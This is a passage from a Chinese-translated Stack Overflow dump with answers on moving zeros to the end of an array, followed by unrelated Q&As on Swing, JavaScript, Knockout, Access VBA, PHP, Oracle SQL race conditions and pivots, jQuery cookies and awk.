    for (int j = 0; j < a.Length; j++)
        if (a[j] != 0)
            a[i++] = a[j];

    while (i < a.Length)
        a[i++] = 0;

} 
```

从可以正式证明正确的归纳解决方案开始，有一些思考导致了这个解决方案。如果你有兴趣，整个分析在这里：[将零值移动到数组的末尾](http://www.codinghelmet.com/?path=exercises/moving-zeros-to-end-of-array)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-07-06T18:58:43.353

```
var size = 10;
var elemnts = [0, 0, 1, 4, 5, 0,-1];
var pos = 0;
for (var i = 0; i < elemnts.length; i++) {
    if (elemnts[i] != 0) {
        elemnts[pos] = elemnts[i];
        pos++;
        console.log(elemnts[i]);
    }
}
for (var i = pos; i < elemnts.length; i++) {
    elemnts[pos++] = 0;
    console.log(elemnts[pos]);
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-01T19:34:49.760

```
int arrNew[] = new int[arr.length];
int index = 0;
for(int i=0;i<arr.length;i++){
    if(arr[i]!=0){
       arrNew[index]=arr[i];
       index++;
    }
} 
```

由于 int 的数组被初始化为零（根据[语言规范](http://docs.oracle.com/javase/specs/#4.12.5)）。这将产生您想要的效果，并将按顺序向上移动其他所有内容。

编辑：根据您不能使用新数组的编辑，此答案不满足您的要求。相反，您需要检查零（从数组的末尾开始并一直工作到开头）并与数组的最后一个元素交换，然后减少最后一个非零元素的索引，然后您将与下一个交换. 前任：

```
int lastZero = arr.length - 1;
if(arr[i] == 0){
  //perform swap and decrement lastZero by 1 I will leave this part up to you
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-03-25T19:17:46.153

```
/// <summary>
/// From a given array send al zeros to the end (C# solution)
/// </summary>
/// <param name="numbersArray">The array of numbers</param>
/// <returns>Array with zeros at the end</returns>
public static int[] SendZerosToEnd(int[] numbersArray)
{
    // Edge case if the array is null or is not long enough then we do
    // something in this case we return the same array with no changes
    // You can always decide to return an exception as well
    if (numbersArray == null ||
        numbersArray.Length < 2)
    {
        return numbersArray;
    }

    // We keep track of our second pointer and the last element index
    int secondIndex = numbersArray.Length - 2,
        lastIndex = secondIndex;

    for (int i = secondIndex; i >= 0; i--)
    {
        secondIndex = i;

        if (numbersArray[i] == 0)
        {
            // While our pointer reaches the end or the next element
            // is a zero we swap elements
            while (secondIndex != lastIndex ||
                numbersArray[secondIndex + 1] != 0)
            {
                numbersArray[secondIndex] = numbersArray[secondIndex + 1];
                numbersArray[secondIndex + 1] = 0;

                ++secondIndex;
            }
            // This solution is like having two pointers
            // Also if we look at the solution you do not pass more than 
            // 2 times actual array will be resume as O(N) complexity 
        }
    }
    // We return the same array with no new one created
    return numbersArray;
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-12-02T10:38:08.567

如果问题添加以下条件。

1.  时间复杂度必须为 O(n) - 您只能迭代一次。
2.  额外的空间复杂度必须为 O(1) - 您不能创建额外的数组。

然后以下实施将正常工作。

要遵循的步骤：

1.  遍历数组并维护非零元素的计数。
2.  每当我们遇到放在数组中计数位置的非零元素时，也会增加计数。
3.  一旦数组被完全迭代，将零放在数组的末尾，直到计数达到数组的原始长度。

> ```
> public static void main(String args[]) {
>   int[] array = { 1, 0, 3, 0, 0, 4, 0, 6, 0, 9 };
>   // Maintaining count of non zero elements
>   int count = -1;
>   // Iterating through array and copying non zero elements in front of array.
>   for (int i = 0; i < array.length; i++) {
>       if (array[i] != 0)
>           array[++count] = array[i];
>   }
>   // Replacing end elements with zero
>   while (count < array.length - 1)
>       array[++count] = 0;
>   for (int i = 0; i < array.length; i++) {
>       System.out.print(array[i] + " ");
>   }
> } 
> ```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2017-04-06T19:29:26.863

时间复杂度 = O(n)，空间复杂度 = O(1)

```
import java.util.Scanner;

public class ShiftZeroesToBack {

    int[] array;
    void shiftZeroes(int[] array) {

        int previousK = 0; 
        int firstTime = 0;

        for(int k = 0; k < array.length - 1; k++) {

            if(array[k] == 0 && array[k + 1] != 0 && firstTime != 0) {
                int temp = array[previousK];
                array[previousK] = array[k + 1];
                array[k + 1] = temp;
                previousK = previousK + 1;
                continue;
            }

            if(array[k] == 0 && array[k + 1] != 0) {
               int temp = array[k];
               array[k] = array[k + 1];
               array[k + 1] = temp;
               continue;
            }

            if(array[k] == 0 && array[k + 1] == 0) {
                if(firstTime == 0) {
                    previousK = k; 
                    firstTime = 1;
                }
            }

       }
   }

   int[] input(Scanner scanner, int size) {
       array = new int[size];
       for(int i = 0; i < size; i++) {
           array[i] = scanner.nextInt();
       }
       return array;
   }

   void print() {
       System.out.println();
       for(int i = 0; i < array.length; i++) {
           System.out.print(array[i] + " ");
       }
       System.out.println();
   }

   public static void main(String[] args) {
       Scanner scanner = new Scanner(System.in);
       ShiftZeroesToBack sztb = new ShiftZeroesToBack();
       System.out.print("Enter Size of Array\t");
       int size = scanner.nextInt();
       int[] input = sztb.input(scanner, size);
       sztb.shiftZeroes(input);
       sztb.print();
   }

} 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2017-10-14T17:09:54.303

假设我们有一个数组

```
[5,4,0,0,6,7,0,8,9] 
```

假设我们有 0-100 之间的数组元素，现在我们的目标是移动数组末尾的所有 0。现在从数组中保存 0 并用非零元素检查它，如果发现任何非零元素与该元素交换，依此类推，在循环结束时，我们将找到解决方案。

**这是代码**

```
for (int i = 0; i < outputArr.length; i++) 
  {

      for (int j = i+1; j < outputArr.length; j++) 
  {
        if(outputArr[i]==0 && outputArr[j]!=0){

            int temp = outputArr[i];
            outputArr[i] = outputArr[j];
            outputArr[j] = temp;

        }

     }
        print outputArr[i]....
} 
```

**输出：**

```
[5,4,6,7,8,9,0,0,0] 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2017-11-05T12:30:18.220

这是我如何实现这一点的。时间复杂度：O(n) 和空间复杂度：O(1) 下面是代码片段：

```
int arr[] = {0, 1, 0, 0, 2, 3, 0, 4, 0};
int i=0, k = 0;
int n = sizeof(arr)/sizeof(arr[0]);
for(i = 0; i<n; i++)
{
  if(arr[i]==0)
    continue;
  arr[k++]=arr[i];
}
for(i=k;i<n;i++)
{
  arr[i]=0;
}

output: {1, 2, 3, 4, 0, 0, 0, 0, 0} 
```

解释：使用另一个变量 k 来保存索引位置，非零元素在保持顺序的同时移到前面。遍历数组后，非零元素被移动到数组的前面，并且从 k 开始的另一个循环用于用零覆盖剩余位置。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2018-02-13T21:07:19.590

这是我的带有 2 个 for 循环的代码：

```
int [] arr = {0, 4, 2, 0, 0, 1, 0, 1, 5, 0, 9,};
int temp;
for (int i = 0; i < arr.length; i++) 
{
  if (arr[i] == 0)
  {
    for (int j = i + 1; j < arr.length; j++) 
    {
      if (arr[j] != 0)
      {
        temp = arr[j];
        arr[j] = arr[i];
        arr[i] = temp;
        break;
      }
    }
  }
}

System.out.println(Arrays.toString(arr)); 
```

输出：[4, 2, 1, 1, 5, 9, 0, 0, 0, 0, 0]

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2018-03-26T06:48:49.120

这是将零移动到数组末尾的一种方法。

```
public class SeparateZeroes1  {

    public static void main(String[] args) {

        int[] a = {0,1,0,3,0,0,345,12,0,13};

        movezeroes(a);      
    }

    static void movezeroes(int[] a) {
        int lastNonZeroIndex = 0;
     // If the current element is not 0, then we need to
        // append it just in front of last non 0 element we found.
    for (int i = 0; i < a.length; i++) {
        if (a[i]  != 0 ) {
            a[lastNonZeroIndex++] = a[i];
        }
    }//for

    // We just need to fill remaining array with 0's.
    for (int i = lastNonZeroIndex; i < a.length; i++) {
        a[i] = 0;
    }   
   System.out.println( lastNonZeroIndex         );
 System.out.println(Arrays.toString(a));

    }
} 
```

这在 Python 中非常简单。我们将通过列表理解来做到这一点

```
a =[0,1,0,3,0,0,345,12,0,13]
def fix(a):
    return ([x for x in a if x != 0] + [x for x in a if x ==0])

print(fix(a)) 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2018-03-30T19:19:18.553

```
 public static void main(String[] args) {
            Integer a[] = {10,0,0,0,6,0,0,0,70,6,7,8,0,4,0};
            int flag = 0;int count =0;
                for(int i=0;i<a.length;i++) {
                if(a[i]==0 ) {
                    flag=1;
                    count++;
                }else if(a[i]!=0) {
                    flag=0;
                }
                if(flag==0 && count>0 && a[i]!=0) {
                    a[i-count] = a[i];
                    a[i]=0;
                }
            }
} 
```

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2018-09-02T15:32:38.600

```
 int[] nums = { 3, 1, 2, 5, 4, 6, 3, 2, 1, 6, 7, 9, 3, 8, 0, 4, 2, 4, 6, 4 };
    List<Integer> list1 = new ArrayList<>();
    List<Integer> list2 = new ArrayList<>();

    for (int i = 0; i < nums.length; i++) {
        if (nums[i] == 3) {
            list1.add(nums[i]);
        } else if (nums[i] != 3) {
            list2.add(nums[i]);
        }
    }
    List<Integer> finalList = new ArrayList<>(list2);
    finalList.addAll(list1);
} 
```

}

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2018-09-02T15:58:49.073

```
int[] nums = {3,1,2,5,4,6,3,2,1,6,7,9,3,8,0,4,2,4,6,4};
    int i = 0;
    for(int j = 0, s = nums.length; j < s;) {
        if(nums[j] == 3)
            j++;
        else {
            int temp = nums[i];
            nums[i] = nums[j];``
            nums[j] = temp;
            i ++;
            j ++;
        }
    } 
```

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2019-01-27T05:16:09.197

对于`Integer`数组，它可以很简单

```
Integer[] numbers = { 1, 10, 0, 5, 7 };
Arrays.sort(numbers, Comparator.comparing(n -> n == 0)); 
```

对于`int`数组：

```
int[] numbers = { 1, 10, 0, 5, 7 };
 numbers = IntStream.of(numbers).boxed()
                    .sorted(Comparator.comparing(n -> n == 0))
                    .mapToInt(i->i).toArray(); 
```

两者的输出：

> [1, 10, 5, 7, 0]

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2019-06-27T15:21:25.773

可以说，你有一个像

```
int a[] = {0,3,0,4,5,6,0}; 
```

然后你可以像这样排序，

```
 for(int i=0;i<a.length;i++){
    for(int j=i+1;j<a.length;j++){
    if(a[i]==0 && a[j]!=0){
    a[i]==a[j];
    a[j]=0;
    }
    }
    } 
```

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2019-07-17T08:32:45.317

```
public void test1(){

    int [] arr = {0,1,0,4,0,3,2};   
    System.out.println("Lenght of array is " + arr.length);

    for(int i=0; i < arr.length; i++){

        for(int j=0; j < arr.length - i - 1; j++){
            if(arr[j] == 0){
                int temp = arr[j];
                arr[j] = arr[arr.length - i - 1]; 
                arr[arr.length - i - 1] = temp;
            }
        }
    }

    for(int x = 0; x < arr.length; x++){
        System.out.println(arr[x]);
    }
} 
```

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2020-02-25T19:39:21.063

### 看看这个函数代码：

```
vector<int> Solution::solve(vector<int> &arr) {
    int count = 0;  
    for (int i = 0; i < arr.size(); i++) 
        if (arr[i] != 0) 
            arr[count++] = arr[i]; 
    while (count < arr.size()) 
        arr[count++] = 0; 
    return arr;
} 
```

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2020-11-03T19:19:21.963

```
 import java.io.*;
  import java.util.*;

  class Solution {

  public static int[] moveZerosToEnd(int[] arr) {

  int j = 0;
  for(int i = 0; i < arr.length; i++) {
    if(arr[i] != 0) {
      swap(arr, i, j);
      j++;
    }
   }
    return arr;
  }
 private static void swap(int arr[], int i, int j){
      int temp = arr[j];
      arr[j] = arr[i];
      arr[i] = temp;
   }

public static void main(String[] args) {
   int arr[] =new int[] {1, 10, 0, 2, 8, 3, 0, 0, 6, 4, 0, 5, 7, 0 };
   System.out.println(Arrays.toString(moveZerosToEnd(arr)));
  }
} 
```

* * *

## 回答 #21

> 赞同：-1
> 
> 时间：2014-11-09T21:42:23.147

在 Python 中重新实现：

**Pythonic方式：**

```
lst = [ 1, 2, 0, 0, 0, 3, 4, 0, 5, 0 ]

for i, val in enumerate(lst):
  if lst[i] == 0:
    lst.pop(i)
    lst.append(0)

print("{}".format(lst)) 
```

**@dcow 在 python 中的实现：**

```
lst = [ 1, 2, 0, 0, 0, 3, 4, 0, 5, 0 ]

i = 0                      # init the index value
for j in range(len(lst)):  # using the length of list as the range
  if lst[j] != 0:
    if i < j: 
      lst[i], lst[j] = lst[j], lst[i]  # swap the 2 elems.
  i += 1

 print("{}".format(lst)) 
```

* * *

## 回答 #22

> 赞同：-1
> 
> 时间：2019-08-06T15:39:45.447

```
a = [ 1, 2, 0, 0, 0, 3, 4, 0, 5, 0 ]

count = 0
for i in range(len(a)):
    if a[i] != 0:
        a[count], a[i] = a[i], a[count]
        count += 1 

print(a)
#op [1, 2, 3, 4, 5, 0, 0, 0, 0, 0] 
```

# java - 如何从 Document Listener 更新 JComboBox 的列表？

> ID：15750289
> 
> 赞同：0
> 
> 时间：2013-04-01T19:27:38.170
> 
> 标签：java, swing, jcombobox, documentlistener

我正在编写一个自定义的 JComboBox，每当用户键入内容时，我都想更新 JComboBox 的下拉菜单。我遇到的问题是，一旦我的 DocumentListener 看到更新，当我尝试将项目添加到列表时就会出错。这是不起作用的基本示例：

```
public class InputField extends JComboBox<String> implements DocumentListener{

//when something is typed, gets suggestions and adds them to the popup
@Override
 public void insertUpdate(DocumentEvent ev) {
    try{
        giveSuggestions(ev);
    }
    catch(StringIndexOutOfBoundsException e){

    }
}
private void giveSuggestions(DocumentEvent ev){
    this.addItem("ok");
} 
```

这实际上不是我的程序的工作方式（我不只是在每次有人键入内容时添加 OK），但让它工作将允许我以它需要的工作方式实现我的自定义 JComboBox。提前感谢您的帮助。

编辑：我得到的错误信息是：

> 线程“AWT-EventQueue-0”java.lang.IllegalStateException 中的异常：尝试在通知中变异

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T20:04:37.500

```
SwingUtilities.invokeLater(new Runnable()
{
    public void run()
    {
        this.addItem("ok");
        // I can never remember the correct way to invoke a class method            
        // from witin and anonymous inner class
        //InputField.addItem("ok"); 
    }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-12-11T07:07:39.130

也许这就是你要找的

```
jComboBox2.getEditor().getEditorComponent().addKeyListener(new java.awt.event.KeyAdapter() {
public void keyReleased(java.awt.event.KeyEvent evt) {
  //add your handling code here:
}   }); 
```

# javascript - 在 JavaScript 中设置 HTML 'for' 属性

> ID：15750290
> 
> 赞同：102
> 
> 时间：2013-04-01T19:27:43.420
> 
> 标签：javascript, dom

在不使用 jQuery 或任何其他库的情况下，如何在 JavaScript`for`中设置 HTML 元素的属性？`<label>`

* * *

## 回答 #1

> 赞同：167
> 
> 时间：2013-04-01T19:27:43.420

使用`htmlFor`属性。我认为它的名称有点神秘，因为`for`它是 JavaScript 中的一个关键字：

```
var label = document.createElement('label');
label.htmlFor = 'some-input-id'; 
```

# knockout.js - 淘汰赛计算的 observable 停止发射

> ID：15750293
> 
> 赞同：1
> 
> 时间：2013-04-01T19:27:45.500
> 
> 标签：knockout.js

这令人费解。这是一个小提琴[http://jsfiddle.net/sujesharukil/TCJjN/1/](http://jsfiddle.net/sujesharukil/TCJjN/1/)

我有一个简单的视图模型，它包含一个计算的 observable。如果特定的私有变量 _editing 设置为 true，则计算出的 observable 将返回 ""。现在 _editing 不是可观察的。如果 _editing 为 false，则计算出的 observable 会查看 observable 并返回计算值。

```
var expressionItem = function(){
    this.id = 10;
    this.value = ko.observable()
};

var vm = function(){

    var textVal = ko.observable(),
        _editing = false,
        expression = ko.observable(),
        displayVal = ko.computed(function(){
            if(_editing)
                return '';

            if(expression() === undefined)
                return '';

            expression().value(textVal());
            return ko.toJSON({Id: expression().id, Value: expression().value()});
        }),
        edit = function(){
            _editing = true;
            textVal('enter new value here');
            _editing = false;
        };

    expression(new expressionItem());        

    return {
        textVal: textVal,
        displayVal: displayVal,
        edit: edit
    }
}

ko.applyBindings(vm()); 
```

这工作正常，直到我将 _editing 标志设置为 false。一旦我这样做，并将其重置为 true，计算的 observable 将不再触发。

我已经注意到的点。1\. 如果我将 _editing 设置为可观察的，那么所有工作都可以正常工作，因为当可观察的发生变化时，显然会触发计算。2\. 如果我将 _editing 保留为不可观察并在我检查之前访问可观察属性，那么一切正常。

所以，我的问题是

1.  为什么会有这种行为？
2.  计算出的 observable 如何被重新评估？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T19:32:15.947

问题是计算出的 observable 的值取决于 的值`_editing`。由于`_editing`不可观察，因此对值的更改不会反映在计算的可观察对象中。

如果`_editing`最初是`true`，则计算出的 observable 立即返回，而不会检测到对其他 observable 的依赖关系，因此当这些 observable 发生变化时永远不会更新。

要解决这个问题，只需使`_editing`变量可观察并且应该解决所有问题。

# ms-access - 尝试从没有扩展名的 URL 打开图像 - VBA

> ID：15750295
> 
> 赞同：0
> 
> 时间：2013-04-01T19:27:48.937
> 
> 标签：ms-access, vba, ms-access-2013

我目前正在尝试处理存储卡片集合的数据库，并且我正在尝试从 Magic 的 Gatherer 服务中获取图像以帮助识别卡片。

这是我目前使用的代码：

```
Private Sub ID_Change()
    cardImage.Picture = "http://gatherer.wizards.com/Handlers/Image.ashx?multiverseid=" & ID.Column(0) & "&type=card"
End Sub 
```

**cardImage**是一个图片对象

**ID**是一个组合框，第一列为 Long Integer。

现在，我的问题是访问不喜欢我提供的 URL，并引发运行时错误 2220。有什么方法可以访问以 JPEG 形式接受 URL 并加载它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:54:03.277

不要使用`Image`对象，而是尝试使用`Web Browser Control`对象并设置其`.ControlSource`属性，例如

```
Me.WebBrowser2.ControlSource = "=""http://gatherer.wizards.com/Handlers/Image.ashx?multiverseid=" & ID.Column(0) & "&type=card""" 
```

# php - 像这样调用属性的php，不好的做法吗？

> ID：15750296
> 
> 赞同：0
> 
> 时间：2013-04-01T19:27:49.993
> 
> 标签：php, oop, class, object, properties

我想知道这样做是否被认为是不好的做法？

```
class myClass
{
    public static $someVars;

    public static function setVars()
    {
        self::$someVars = new stdClass;
        self::$someVars->var1 = 'Some Text';
        self::$someVars->var2 = 'something Else';
        self::$someVars->var3 = 'Different Content Here';
    }
    public static function getVar()
    {
        return self::$someVars;
    }
}
myClass::setVars();
echo myClass::getVar()->var1; 
```

我一直在尝试找到有关以这种方式访问​​ $someVars 属性的方法，但是没有运气，这使我相信这可能是不好的做法。

此外，使用相同的设置，我可以像这样更新属性：

```
myClass::getVar()->var1 = 'New Texts, WOOT!';
echo myClass::getVar()->var1; 
```

再说一次，可接受的还是不好的做法？

像这样访问属性/对象叫什么？我已经在谷歌上搜索了一个多小时，但找不到任何关于它的信息，可能是因为不知道要搜索什么，或者可能是因为它是一种令人讨厌的做生意方式；）

感谢您的帮助和帮助我学习！

# sql - 如何保证带有子查询的原子 SQL 插入？

> ID：15750301
> 
> 赞同：3
> 
> 时间：2013-04-01T19:28:08.697
> 
> 标签：sql, oracle, race-condition

给定一个像这样的简化表结构：

```
 CREATE TABLE t1 (
        id INT,
        num INT,
        CONSTRAINT t1_pk
        PRIMARY KEY (id),
        CONSTRAINT t1_uk
        UNIQUE (id, num)
    ) 
```

我可以使用这样的子查询来插入记录而不引起竞争条件吗？

```
INSERT INTO t1 (
    id,
    num
) VALUES (
    1,
    (
        SELECT MAX(num) + 1
        FROM   t1
    )
) 
```

或者子查询不是原子的？我担心同时`INSERT`s 获取相同的值`num`，然后导致违反唯一约束。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-01T19:35:49.103

是的，这肯定会产生竞争条件，因为虽然所有语句都保证是原子的，但这并不要求它们在查询执行的各个部分期间对不变的数据集进行操作。

客户提交您的上述查询。只要引擎找到`MAX(num)`只持有与其他读取器兼容的锁的同时，另一个客户端就可以在执行`MAX(num)`之前找到相同的锁`INSERT`。

我知道有四种方法可以解决这个问题：

1.  *使用[序列](http://www.techonthenet.com/oracle/sequences.php)。*在中，`INSERT`您只需`sequencename.nextval`返回要插入的下一个唯一编号。

    ```
    SQL> create sequence t1num;

    Sequence created.

    SQL> select t1num.nextval from dual;

       NEXTVAL
    ----------
             1

    SQL> select t1num.nextval from dual;

       NEXTVAL
    ----------
             2 
    ```

2.  *重试失败。*我阅读了一篇关于每秒事务数非常高的系统的可信文章，该系统的场景与此不完全相同，但遭受了`INSERT`可能使用错误值的相同竞争条件。他们发现，通过首先给出`num`唯一约束，然后正常进行，可以实现最高 TPS，如果`INSERT`由于违反唯一约束而被拒绝，客户端将简单地重试。

3.  *添加一个锁定提示，强制引擎阻止其他读取器，直到`INSERT`完成*。虽然这在技术上可能很容易，但它可能不适合高并发。如果`MAX()`使用单次搜索执行，并且阻塞时间不长并且不会阻塞许多客户端，理论上它是可以接受的，但大多数系统会随着时间的推移而增长，很快就会出现这种风险。

4.  *使用单独的单行辅助表记录`num`.* 对辅助表执行同时读取和`UPDATE`，然后将读取的值分别用于`INSERT`主表。在我看来，这有点令人烦恼，因为它不是单个查询，而且它确实存在这样的问题，即如果客户端设法“保留” 的值`num`，但由于任何原因未能实际执行`INSERT`，则可能会出现间隙在表中的值`num`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T20:48:23.603

```
SET TRANSACTION ISOLATION LEVEL SERIALIZABLE;
INSERT INTO t1 (id, num) VALUES (1, (SELECT MAX(num) + 1 FROM t1));
COMMIT; 
```

或者

```
LOCK TABLE t1 IN EXCLUSIVE MODE;
INSERT INTO t1 (id, num) VALUES (1, (SELECT MAX(num) + 1 FROM t1));
COMMIT; 
```

两者都会导致执行相同操作的同时进程出现性能问题。但是，如果要求保证无间隙序列，那么这就是成本。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T21:28:31.343

```
DROP SCHEMA tmp CASCADE;
CREATE SCHEMA tmp ;
SET search_path=tmp; 
```

应该评估所有子查询*，就好像*它们是在查询开始时拍摄的快照一样。在 Postgres 中无需额外措施即可工作：

```
CREATE TABLE hopla
        ( the_id SERIAL NOT NULL PRIMARY KEY
        , tralala varchar
        );

INSERT INTO hopla(tralala)
SELECT 'tralala_' || gs::text
FROM generate_series(1,4) gs
        ;

SELECT * FROM hopla;
INSERT INTO hopla(the_id, tralala)
SELECT mx.mx + row_number() OVER (ORDER BY org.the_id)
        , org.tralala
FROM hopla org
, (SELECT MAX(the_id) AS mx FROM hopla) mx
        ;

SELECT * FROM hopla; 
```

结果/输出：

```
CREATE TABLE
INSERT 0 4
 the_id |  tralala  
--------+-----------
      1 | tralala_1
      2 | tralala_2
      3 | tralala_3
      4 | tralala_4
(4 rows)

INSERT 0 4
 the_id |  tralala  
--------+-----------
      1 | tralala_1
      2 | tralala_2
      3 | tralala_3
      4 | tralala_4
      5 | tralala_1
      6 | tralala_2
      7 | tralala_3
      8 | tralala_4
(8 rows) 
```

# jquery - Jquery Cookie 代码不起作用

> ID：15750303
> 
> 赞同：0
> 
> 时间：2013-04-01T19:28:12.480
> 
> 标签：jquery, twitter-bootstrap, jquery-cookie

```
<!-- Modal -->
<div id="appsmodal" class="modal hide fade" tabindex="-1" role="dialog"
aria-labelledby="myModalLabel" aria-hidden="true">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
<h3 id="myModalLabel">Modal header</h3>
</div>
<div class="modal-body">
<p>One fine body…&lt;/p>
</div>
<div class="modal-footer">
<button class="btn" data-dismiss="modal" aria-hidden="true">Close</button>
<button class="btn btn-primary">Save changes</button>
</div>
</div>
<script type="text/javascript">
    $(document).ready(function() {

        if($.cookie('msg') == 0)
        {
            $('#appsmodal').modal('show');
            $.cookie('msg', 1);
        }

    });
</script> 
```

我已经困惑了大约一个小时，但无济于事。在我用尽所有资源之前，我宁愿不提问。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T20:14:47.970

从文档[https://github.com/carhartl/jquery-cookie](https://github.com/carhartl/jquery-cookie)：

```
Create session cookie:

$.cookie('the_cookie', 'the_value');
Create expiring cookie, 7 days from then:

$.cookie('the_cookie', 'the_value', { expires: 7 });
Create expiring cookie, valid across entire site:

$.cookie('the_cookie', 'the_value', { expires: 7, path: '/' });
Read cookie:

$.cookie('the_cookie'); // => "the_value"
$.cookie('not_existing'); // => undefined
Read all available cookies:

$.cookie(); // => { "the_cookie": "the_value", "...remaining": "cookies" }
Delete cookie: 
```

打开浏览器的控制台并检查是否有任何错误语句（例如，您是否包括 cookie 库）。此外，使用浏览器中的检查器确保 cookie 确实被设置： http: [//getfirebug.com/cookies](http://getfirebug.com/cookies)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T03:53:48.563

最后！

我想到了。Joomla 问题

# sql - 初级 Oracle SQL 计数函数 多列

> ID：15750313
> 
> 赞同：2
> 
> 时间：2013-04-01T19:28:37.080
> 
> 标签：sql, oracle, function, count

我正在阅读带有问题和预期输出的练习工作表。最后一个问题对我来说很难理解。任何人都可以帮忙吗？

问题

创建一个查询以显示员工总数以及 2005 年、2006 年、2007 年和 2008 年雇用的员工总数。

预期的输出格式

```
Total 2005 2006 2007 2008
107   29   24   19   11 
```

以下是我尝试通过单独的查询获得结果

```
TO_CHAR(hire_date,'YYYY')
SELECT COUNT(employee_id) AS "Total"
FROM employees;

SELECT COUNT(employee_id) AS "2005"
FROM employees
WHERE TO_CHAR(hire_date,'YYYY') LIKE '2005' GROUP BY TO_CHAR(hire_date,'YYYY') ;

SELECT COUNT(employee_id) AS "2006"
FROM employees
WHERE TO_CHAR(hire_date,'YYYY') LIKE '2006' GROUP BY TO_CHAR(hire_date,'YYYY') ;

SELECT COUNT(employee_id) AS "2007"
FROM employees
WHERE TO_CHAR(hire_date,'YYYY') LIKE '2007' GROUP BY TO_CHAR(hire_date,'YYYY') ;

SELECT COUNT(employee_id) AS "2008"
FROM employees
WHERE TO_CHAR(hire_date,'YYYY') LIKE '2008' GROUP BY TO_CHAR(hire_date,'YYYY') ; 
```

非常感谢任何将结果作为一个查询产生的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T19:36:00.307

要将这些放在列中，请使用条件聚合：

```
select count(*) as Total,
       sum(case when to_char(hire_date, 'yyyy') = '2005' then 1 else 0 end) as "2005",
       sum(case when to_char(hire_date, 'yyyy') = '2006' then 1 else 0 end) as "2006",
       sum(case when to_char(hire_date, 'yyyy') = '2007' then 1 else 0 end) as "2007",
       sum(case when to_char(hire_date, 'yyyy') = '2008' then 1 else 0 end) as "2008"
from employees
where to_char(hire_date, 'yyyy') in ('2005', 2006', '2007', '2008') 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T19:36:59.550

您正在尝试对数据进行*透视*，因此您可以使用现有查询，但`CASE`在聚合内添加一个表达式：

```
SELECT COUNT(employee_id) AS "Total",
    sum(case when TO_CHAR(hire_date,'YYYY') = '2005' then 1 else 0 end) "2005",
    sum(case when TO_CHAR(hire_date,'YYYY') = '2006' then 1 else 0 end) "2006",
    sum(case when TO_CHAR(hire_date,'YYYY') = '2007' then 1 else 0 end) "2007",
    sum(case when TO_CHAR(hire_date,'YYYY') = '2008' then 1 else 0 end) "2008"
FROM employees; 
```

根据您的 Oracle 版本，您可能可以使用该`PIVOT`功能：

```
select *
from
(
  select count(*) over() Total,
    TO_CHAR(hire_date,'YYYY') Year
  from employees
) 
pivot
(
    count(Year)
    for Year in ('2005', '2006', '2007', '2008')
) 
```

查看[两个查询的演示](http://sqlfiddle.com/#!4/b1067/3)

# sed - 使用 awk 或 sed 编辑文件倒数第二行的一个衬垫？

> ID：15750318
> 
> 赞同：0
> 
> 时间：2013-04-01T19:28:49.470
> 
> 标签：sed, awk

原始文件：

```
{ 

A:2, 

B:2, 

C:2, 

} 
```

必需的：

```
{

A:2,

B:2, 

C:2 

} 
```

有没有办法在一行中使用 awk 或 sed 来做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T19:37:00.023

使用 GNU awk：

```
$ cat file
{

A:2,

B:2,

C:2,

}

$ gawk -v RS='\0' -v ORS= '{print gensub(/,([^,]+)$/,"\\1","")}' file
{

A:2,

B:2,

C:2

} 
```

如果您需要对包含上述多个块的文件执行此操作，请将脚本更改为：

```
gawk -v RS='\0' -v ORS= '{print gensub(/,([^,]+)$/,"\\1","")}' file 
```

到：

```
gawk -v RS='\0' -v ORS= '{print gensub(/,([^,]+})/,"\\1","g")}' file 
```

例如：

```
$ cat file
{

A:2,

B:2,

C:2,

}

{

D:2,

E:2,

F:2,

}
$
$ gawk -v RS='\0' -v ORS= '{print gensub(/,([^,]+})/,"\\1","g")}' file
{

A:2,

B:2,

C:2

}

{

D:2,

E:2,

F:2

} 
```

# java - Java JSlider菱形是透明的吗？

> ID：15750321
> 
> 赞同：0
> 
> 时间：2013-04-01T19:28:52.457
> 
> 标签：java, swing, slider, transparent, jslider

当我制作 JSlider 时，滑块“菱形”似乎是透明的（边框除外）。我不知道为什么。有没有人见过这个或有任何想法？

```
 //create slider
    JSlider slider = new JSlider(JSlider.HORIZONTAL, 0,10, 5);
    slider.setBounds(100,500,300,40);
    mainContainer.add(slider); 
```

编辑：

我似乎已经回答了我自己的问题。事实证明，我需要在 JSlider 之前设置外观：

```
 //Set Look and Feel
    try
    {
        UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
    }
    catch (ClassNotFoundException e) {}
    catch (InstantiationException e) {}
    catch (IllegalAccessException e) {}
    catch (UnsupportedLookAndFeelException e) {}

    //create slider
    JSlider slider = new JSlider(JSlider.HORIZONTAL, 0,10, 5);
    slider.setBounds(100,500,300,40);
    mainContainer.add(slider); 
```

颠倒顺序会导致透明度问题。

# c# - 仅当第二个子级表满足列中的值的条件时才返回人员 ID

